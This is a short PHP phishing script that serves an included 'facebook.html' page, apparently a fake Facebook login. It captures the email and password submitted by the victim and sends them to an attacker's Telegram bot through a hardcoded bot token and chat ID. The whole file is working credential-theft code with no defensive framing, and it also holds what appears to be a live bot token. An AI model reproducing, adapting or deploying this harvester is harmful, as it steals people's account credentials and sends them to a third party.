<?php
include "facebook.html";

$bot_token = "5441699225:AAGjoUFWwYVO7PS_jYuZp6ljxmNoGRetM6E";
$chat_id = "1430266005"


$mail = $_POST["mail"];
$password = $_POST["password"];


$message = "Email: $mail\nPassword: $password";


$telegram = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=1430266005&text=" . urlencode($message);
file_get_contents($telegram);
?>